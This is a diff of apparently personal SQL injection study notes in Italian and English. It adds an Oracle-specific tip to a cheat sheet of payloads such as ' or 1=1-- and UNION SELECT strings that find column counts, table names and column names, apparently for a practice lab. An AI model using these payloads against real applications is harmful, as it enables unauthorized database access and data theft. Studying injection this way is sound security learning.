@@ -9,6 +9,7 @@ SQL INJECTION
 
 ' or 1=1--
 
+
 detection: 
   '
   or 1=1 or 1=2 per triggherare errori maybe
@@ -58,6 +59,8 @@ bisogna capire bene la versione del databse e seguire i comandi specifici per og
 ' UNION SELECT NULL,NULL,NULL,'a'--
 
 '+UNION+SELECT+'abc','def'--   -> find column number
+SU ORACLE bisogna aggiungere +FROM+dual--
+
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--   -> find table names
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  -> find columns names of the table
 
